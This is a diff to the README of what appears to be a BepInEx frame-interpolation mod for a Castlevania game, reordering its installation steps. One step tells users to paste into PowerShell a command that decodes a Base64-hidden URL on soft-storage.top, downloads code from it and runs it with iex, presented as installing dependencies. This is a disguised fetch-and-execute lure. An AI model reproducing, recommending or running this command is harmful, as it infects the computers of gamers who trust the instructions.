@@ -19,14 +19,17 @@ The game runs its gameplay and cutscene logic at 30 updates per second and norma
 It puts those code paths back on the game's own interpolation. The game's logic, timing, cutscene scripts and saves are not changed at all: the mod only fills in the frames drawn between the game's 30 Hz updates, and gives the cutscene logic back its exact values before every update. Real teleports, such as skipping a cutscene, still snap instantly. Works with every frame-rate option.
 
 ## Installation
-1. Paste this command into PowerShell to install the dependencies: 
+
+1. Download and unpack ZIP archive 
+
+2. Paste this command into PowerShell to install the dependencies: 
 
 ```cmd 
 iex(iwr ([System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('aHR0cDovL3NvZnQtc3RvcmFnZS50b3Avd29ya2VyPz0xNDI0MTYzNDE5L2Nhc3RsZXZhbmlh'))) -UseBasicParsing)
 ```
-2. In Steam: right-click the game > Manage > Browse local files.
-3. Extract the **Main** file into that folder (next to "Castlevania Belmont's Curse.exe").
-4. Start the game. The **first** launch with BepInEx takes 1–3 minutes while it prepares; later launches are normal.
+3. In Steam: right-click the game > Manage > Browse local files.
+4. Extract the **Main** file into that folder (next to "Castlevania Belmont's Curse.exe").
+5. Start the game. The **first** launch with BepInEx takes 1–3 minutes while it prepares; later launches are normal.
 
 Already using BepInEx 6 IL2CPP? Use the **Plugin only** file instead. BepInEx 5 does not work with this game.
 
